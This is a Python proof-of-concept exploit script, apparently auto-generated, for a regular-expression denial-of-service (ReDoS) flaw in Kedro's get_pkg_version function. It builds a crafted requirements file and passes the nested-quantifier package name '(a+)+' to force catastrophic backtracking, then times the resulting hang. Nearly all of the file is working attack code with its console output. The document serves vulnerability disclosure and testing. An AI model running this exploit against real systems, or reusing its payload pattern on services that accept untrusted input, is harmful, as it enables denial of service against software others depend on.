#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: redos-010
# Sink: get_pkg_version
# Auto-generated — run with: python3 redos_timeout_input_length_limits_get_pkg_version.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for REDOS vulnerability in Kedro's get_pkg_version().

Vulnerability: The function compiles a regex pattern using user-controlled
package_name without sanitization. If package_name contains nested quantifiers
like (a+)+, the regex can cause catastrophic backtracking when matched against
a crafted input line from the requirements file.

This PoC demonstrates the vulnerability by:
1. Creating a malicious requirements file with a line designed to trigger
   catastrophic backtracking
2. Calling get_pkg_version() with a crafted package_name containing nested
   quantifiers
3. Showing that the regex takes an extremely long time (or hangs) due to
   catastrophic backtracking

Usage:
    python3 poc_kedro_redos.py

Requirements:
    - kedro package installed (the vulnerable version)
    - Python 3.6+
"""

import os
import re
import tempfile
import time
import warnings
from pathlib import Path

# Suppress deprecation warnings from Kedro
warnings.filterwarnings("ignore", category=DeprecationWarning)


def create_malicious_requirements_file() -> str:
    """
    Create a temporary requirements.txt file with a line designed to trigger
    catastrophic backtracking.

    The line consists of many 'a' characters followed by a non-word character.
    When matched against the regex (a+)+([^\\w]|$), this causes exponential
    backtracking because the nested quantifiers (a+)+ try all possible ways
    to split the 'a's into groups.

    Returns:
        Path to the temporary requirements file
    """
    # Create a line with many 'a's followed by a space (non-word character)
    # The number of 'a's determines the backtracking complexity
    # With 30 'a's, the regex engine will try 2^30 ≈ 1 billion paths
    num_as = 30
    malicious_line = "a" * num_as + " "

    # Write to a temporary file
    tmp_fd, tmp_path = tempfile.mkstemp(suffix=".txt", prefix="requirements_")
    with os.fdopen(tmp_fd, "w", encoding="utf-8") as f:
        f.write(malicious_line + "\n")
        # Add some normal lines to make it look like a real requirements file
        f.write("numpy==1.21.0\n")
        f.write("pandas==1.3.0\n")

    return tmp_path


def trigger_vulnerability(reqs_path: str) -> None:
    """
    Trigger the REDOS vulnerability by calling get_pkg_version() with a
    crafted package_name.

    The package_name contains nested quantifiers (a+)+ which, when combined
    with the malicious requirements line, causes catastrophic backtracking.

    Args:
        reqs_path: Path to the malicious requirements file
    """
    # Craft a package_name with nested quantifiers
    # The regex becomes: (a+)+([^\w]|$)
    # This matches one or more 'a's, one or more times, followed by a non-word
    # character or end of string
    malicious_package_name = "(a+)+"

    print(f"[*] Requirements file: {reqs_path}")
    print(f"[*] Malicious package_name: {malicious_package_name!r}")
    print(f"[*] Resulting regex pattern: {malicious_package_name + r'([^\\w]|$)'!r}")
    print()

    # Read the first line of the requirements file to show what we're matching
    with open(reqs_path, "r", encoding="utf-8") as f:
        first_line = f.readline().strip()
    print(f"[*] First line of requirements file: {first_line!r}")
    print(f"[*] Length of 'a's: {len(first_line.split()[0])}")
    print()

    # Time the regex matching
    print("[*] Attempting to match regex against malicious line...")
    print("[*] This will likely hang or take a very long time due to catastrophic backtracking.")
    print("[*] Press Ctrl+C to abort if it hangs indefinitely.")
    print()

    start_time = time.time()
    try:
        # This is the vulnerable call - it will try to match the regex against
        # each line of the file. The malicious line will cause catastrophic
        # backtracking.
        from kedro.framework.cli.utils import get_pkg_version

        result = get_pkg_version(reqs_path, malicious_package_name)
        elapsed = time.time() - start_time
        print(f"[!] Unexpected: regex matched in {elapsed:.2f} seconds")
        print(f"[!] Result: {result!r}")
    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n[!] Interrupted after {elapsed:.2f} seconds - catastrophic backtracking confirmed!")
        print("[!] The regex engine was stuck trying all possible ways to split the 'a's.")
    except Exception as e:
        elapsed = time.time() - start_time
        print(f"[!] Exception after {elapsed:.2f} seconds: {e}")


def demonstrate_safe_behavior() -> None:
    """
    Demonstrate that with a normal package name, the function works correctly
    and quickly.
    """
    print("\n" + "=" * 60)
    print("[*] Demonstrating safe behavior with a normal package name")
    print("=" * 60)

    # Create a normal requirements file
    tmp_fd, tmp_path = tempfile.mkstemp(suffix=".txt", prefix="requirements_")
    with os.fdopen(tmp_fd, "w", encoding="utf-8") as f:
        f.write("numpy==1.21.0\n")
        f.write("pandas==1.3.0\n")

    from kedro.framework.cli.utils import get_pkg_version

    start_time = time.time()
    result = get_pkg_version(tmp_path, "numpy")
    elapsed = time.time() - start_time
    print(f"[*] Found package in {elapsed:.4f} seconds: {result!r}")

    # Clean up
    os.unlink(tmp_path)


def main():
    """Main function to run the PoC."""
    print("=" * 60)
    print("Kedro REDOS Proof-of-Concept Exploit")
    print("=" * 60)
    print()

    # Check if kedro is installed
    try:
        import kedro  # noqa: F401
    except ImportError:
        print("[!] Kedro is not installed. Please install it first:")
        print("    pip install kedro")
        return

    # Create malicious requirements file
    reqs_path = create_malicious_requirements_file()
    print(f"[*] Created malicious requirements file at: {reqs_path}")
    print()

    try:
        # Trigger the vulnerability
        trigger_vulnerability(reqs_path)
    finally:
        # Clean up the temporary file
        os.unlink(reqs_path)
        print(f"\n[*] Cleaned up temporary file: {reqs_path}")

    # Demonstrate safe behavior
    demonstrate_safe_behavior()

    print()
    print("[*] PoC completed.")


if __name__ == "__main__":
    main()
